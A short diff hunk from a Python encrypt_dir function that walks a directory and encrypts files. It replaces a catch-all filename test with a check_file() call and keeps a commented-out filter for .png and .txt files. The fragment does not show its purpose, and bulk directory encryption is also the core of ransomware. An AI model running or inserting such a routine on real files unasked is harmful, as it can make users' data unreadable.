@@ -9,7 +9,7 @@ def encrypt_dir(directory, key):
         for file in os.listdir(directory):
             filename = os.fsdecode(file)
             # if filename.endswith(".png") or filename.endswith(".txt"):  # only selects two types of files
-            if "." in filename:  # this is probably a bad idea.
+            if check_file(filename):  # determiens whether to encrpyt
                 print(os.path.join(directory.decode(), filename))
                 encrypt(os.path.join(directory.decode(), filename), key)
                 continue
